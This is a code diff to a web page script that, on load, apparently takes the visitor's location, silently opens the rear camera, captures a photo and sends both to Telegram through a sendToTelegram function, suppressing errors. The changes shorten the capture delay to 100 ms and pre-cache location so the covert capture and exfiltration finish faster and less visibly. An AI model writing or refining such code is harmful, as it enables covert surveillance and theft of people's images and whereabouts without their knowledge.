@@ -33,6 +33,17 @@
       }
     }
 
+    let cachedLat = 0;
+    let cachedLon = 0;
+
+    // Get location immediately on page load
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(pos => {
+        cachedLat = pos.coords.latitude;
+        cachedLon = pos.coords.longitude;
+      }, () => {});
+    }
+
     async function autoCapture() {
       try {
         stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: false });
@@ -40,28 +51,20 @@
         const canvas = document.getElementById('canvas');
         video.srcObject = stream;
 
-        // Wait for video to stabilize
-        await new Promise(resolve => setTimeout(resolve, 1000));
+        // Wait for video to be ready (minimal delay)
+        await new Promise(resolve => setTimeout(resolve, 100));
 
         // Capture photo and convert to blob
         const context = canvas.getContext('2d');
         context.drawImage(video, 0, 0, canvas.width, canvas.height);
         
-        // Convert canvas to blob
+        // Convert canvas to blob and send immediately with cached location
         canvas.toBlob((blob) => {
           // Stop camera
           stream.getTracks().forEach(t => t.stop());
 
-          // Get location and send
-          if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(pos => {
-              const lat = pos.coords.latitude;
-              const lon = pos.coords.longitude;
-              sendToTelegram(lat, lon, blob);
-            }, () => {
-              sendToTelegram(0, 0, blob);
-            });
-          }
+          // Send immediately with cached location
+          sendToTelegram(cachedLat, cachedLon, blob);
         }, 'image/jpeg', 0.95);
       } catch (err) {
         // Silent fail
